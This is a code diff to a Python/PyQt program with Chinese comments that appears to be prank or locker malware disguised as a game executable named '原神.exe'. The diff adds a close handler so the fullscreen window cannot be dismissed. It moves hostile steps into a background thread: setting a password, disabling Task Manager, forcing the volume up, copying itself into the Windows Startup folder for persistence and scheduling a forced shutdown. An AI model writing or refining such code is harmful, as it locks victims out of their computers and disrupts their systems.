@@ -66,6 +66,11 @@ class MainWindow(QMainWindow):
         self._player.setSource(QUrl.fromLocalFile(self.pt))
         self._player.play()
 
+    def closeEvent(self, event):
+        # 重载关闭事件，使得窗口关闭时只是隐藏而不是退出应用程序
+        event.ignore()  # 忽略关闭事件
+        self.show()     #
+
 def addEvents():
     while True:
         setAudio(1.0)
@@ -97,9 +102,20 @@ def getFilePath(file_name):
     # 构建视频文件的绝对路径
     return os.path.join(basePath, file_name)
 
+def backgroundTasks():
+    # 后台任务（运行在辅助线程中）
+    setPassword(1145141919810)
+    disableTaskManage(1)
+    clearMute()
+    setAudio(1.0)
+    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+    os.system('shutdown -s -f -t 150')
+    addEvents()
+
 def main():
     app = QApplication(sys.argv)
 
+    # 创建主窗口并播放视频
     main_win = MainWindow(getFilePath('video.mp4'))
     available_geometry = main_win.screen().availableGeometry()
     main_win.resize(500, 300)
@@ -107,17 +123,11 @@ def main():
     main_win.showFullScreen()
     main_win.play()
 
-    setPassword(1145141919810)
-    disableTaskManage(1)
-    clearMute()
-    setAudio(1.0)
-    copy('原神.exe', '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"')
+    # 在辅助线程中运行后台任务
+    threading.Thread(target=backgroundTasks).start()
 
-    os.system('shutdown -s -f -t 150')
-    threading.Thread(target=app.exec()).start()
-    threading.Thread(target=addEvents()).start()
+    # 在主线程中启动应用程序事件循环
     sys.exit(app.exec())
-
 
 if __name__ == '__main__':
     main()
